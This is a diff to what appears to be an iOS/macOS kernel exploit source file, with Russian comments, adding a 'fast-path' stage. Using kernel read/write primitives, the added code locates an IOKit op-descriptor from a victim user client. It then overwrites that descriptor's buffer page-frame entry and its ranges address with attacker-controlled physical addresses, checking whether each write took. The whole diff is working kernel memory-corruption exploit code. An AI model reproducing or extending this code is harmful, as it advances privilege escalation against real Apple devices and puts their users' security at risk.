@@ -7285,7 +7285,69 @@ kpx_submit1: ;
     *(uint64_t *)(tsdV + 8) = 1;   // async
     kern_return_t avkr = IOConnectCallMethod(victim, 1, NULL, 0, tsdV, sizeof(tsdV), NULL, NULL, NULL, NULL);
     kpNote(r, [NSString stringWithFormat:@"  victim#1 async submit (real src): kr=0x%x — mapping кэшируется на pipe", avkr]);
-    if (nDep) goto kpx_retry;   // 1.9.262 fast-path: CHAIN вооружён — SPC/SCAN B/цепи не нужны
+    // 1.9.263: OPD-пробник+патч на fast-path — в проигрышных бутах (258/259/262c)
+    // сериализатор не читал наши источники вообще. Читаем op-дескриптор (р.57:
+    // op → [op+0x438]+0x98 cmd → [cmd+0x48] desc): его тип-ниббл (р.65 L3), гейты
+    // [op+0xc04]/[cmd+0x68] (р.65 L1/L2) и его СОБСТВЕННЫЙ record buffer — если это
+    // снапшот-копия с оригинальным pfn (создана до нашего патча), патчим и его.
+    if (nDep) {
+        uint64_t vcO = kpM2TClientVA(r, isTable, victim, @"opc263-victim");
+        uint64_t ucO = kpLooksLikeKernelPointer(vcO) ? kp_untag_ptr(early_kread64(vcO + 0x30)) : 0;
+        uint64_t provO = kpLooksLikeKernelPointer(ucO) ? kp_untag_ptr(early_kread64(ucO + 0xe8)) : 0;
+        uint64_t opVA = 0;
+        if (kpLooksLikeKernelPointer(provO) && kpSafeToRead(provO)) {
+            uint64_t arrays[2] = { kp_untag_ptr(early_kread64(provO + 0xc8)), kp_untag_ptr(early_kread64(provO + 0x110)) };
+            uint64_t counts[2] = { early_kread64(provO + 0xb8), early_kread64(provO + 0x100) };
+            for (int ai = 0; ai < 2 && !opVA; ai++) {
+                uint64_t arr = arrays[ai];
+                uint64_t cnt = counts[ai]; if (cnt > 256) cnt = 256;
+                if (!kpLooksLikeKernelPointer(arr)) continue;
+                for (uint64_t i = 0; i < cnt && !opVA; i++) {
+                    uint64_t op = kp_untag_ptr(early_kread64(arr + i * 8));
+                    if (!kpLooksLikeKernelPointer(op) || !kpSafeToRead(op)) continue;
+                    if (kp_untag_ptr(early_kread64(op + 0x48)) == ucO) { opVA = op; break; }
+                }
+            }
+        }
+        if (opVA) {
+            uint64_t c04 = early_kread64(opVA + 0xc04);
+            uint64_t ps = kp_untag_ptr(early_kread64(opVA + 0x438));
+            if (!kpLooksLikeKernelPointer(ps)) ps = kp_untag_ptr(early_kread64(opVA + 0x6f8));
+            uint64_t cmd = kpLooksLikeKernelPointer(ps) ? kp_untag_ptr(early_kread64(ps + 0x98)) : 0;
+            uint64_t c68 = (kpLooksLikeKernelPointer(cmd) && kpSafeToRead(cmd)) ? early_kread64(cmd + 0x68) : 0;
+            uint64_t desc = (kpLooksLikeKernelPointer(cmd) && kpSafeToRead(cmd)) ? kp_untag_ptr(early_kread64(cmd + 0x48)) : 0;
+            uint64_t dtyp = (kpLooksLikeKernelPointer(desc) && kpSafeToRead(desc)) ? (early_kread64(desc + 0x20) & 0xf0) : 0xff;
+            uint64_t hdr2 = kpLooksLikeKernelPointer(desc) ? kp_untag_ptr(early_kread64(desc + 0x90)) : 0;
+            uint64_t buf2 = kpLooksLikeKernelPointer(hdr2) ? kp_untag_ptr(early_kread64(hdr2 + 0x10)) : 0;
+            uint64_t e2 = kpLooksLikeKernelPointer(buf2) ? early_kread64(buf2 + 0x30) : 0;
+            uint64_t rng2 = kpLooksLikeKernelPointer(desc) ? kp_untag_ptr(early_kread64(desc + 0x60)) : 0;
+            uint64_t ra2 = kpLooksLikeKernelPointer(rng2) ? early_kread64(rng2 + 0x00) : 0;
+            kpNote(r, [NSString stringWithFormat:@"  [OPD] op=%#llx gate=%#llx cmdCache=%#llx desc=%#llx type=%#llx opbuf=%#llx entry0=%#018llx ranges[0]=%#018llx",
+                      (unsigned long long)opVA, (unsigned long long)c04, (unsigned long long)c68,
+                      (unsigned long long)desc, (unsigned long long)dtyp, (unsigned long long)buf2,
+                      (unsigned long long)e2, (unsigned long long)ra2]);
+            // op-desc record buffer — снапшот с оригинальным pfn? патчим и его
+            if (kpLooksLikeKernelPointer(buf2) && (uint32_t)e2 == pfn32 &&
+                ((uint32_t)(e2 >> 32) == 0 || (uint32_t)(e2 >> 32) == 4) && nDep < 24) {
+                usleep(1500);
+                early_kwrite64(buf2 + 0x30, (e2 & 0xffffffff00000000ULL) | ctlPFN);
+                uint64_t rb = early_kread64(buf2 + 0x30);
+                kpNote(r, [NSString stringWithFormat:@"  [OPD] ★ op-desc buf entry0 → ctlPFN: %#018llx — %@", (unsigned long long)rb, (uint32_t)rb == ctlPFN ? @"ПРИЛИПЛО" : @"МИМО"]);
+                hitAddr[nDep] = buf2 + 0x30; hitOld[nDep] = e2; hitForm[nDep] = 5; nDep++;
+            }
+            // type-0x20 op-desc → ranges[0].addr = ctlPA (р.65 Q3)
+            if (dtyp == 0x20 && kpLooksLikeKernelPointer(rng2) && nDep < 24) {
+                usleep(1500);
+                early_kwrite64(rng2 + 0x00, ctlPA);
+                uint64_t rb = early_kread64(rng2 + 0x00);
+                kpNote(r, [NSString stringWithFormat:@"  [OPD] ★ op-desc ranges[0].addr → ctlPA: %#018llx — %@", (unsigned long long)rb, rb == ctlPA ? @"ПРИЛИПЛО" : @"МИМО"]);
+                hitAddr[nDep] = rng2; hitOld[nDep] = ra2; hitForm[nDep] = 6; nDep++;
+            }
+        } else {
+            kpNote(r, [NSString stringWithFormat:@"  [OPD] op-entry не найден (UC=%#llx prov=%#llx)", (unsigned long long)ucO, (unsigned long long)provO]);
+        }
+        goto kpx_retry;
+    }
     // 1.9.222: SPEC-яд — голый pfn32 по +0x58 = ranges-spec rewriter'а (р.52/55:
     // ldr w8,[x22,#0x58] → desc+0x9c). ПРЯМОЙ ПУТЬ (р.55): spec = [planeDesc+0x60],
     // заполняется РАЗ при create, per-execute лишь перечитывается — патч стабилен.
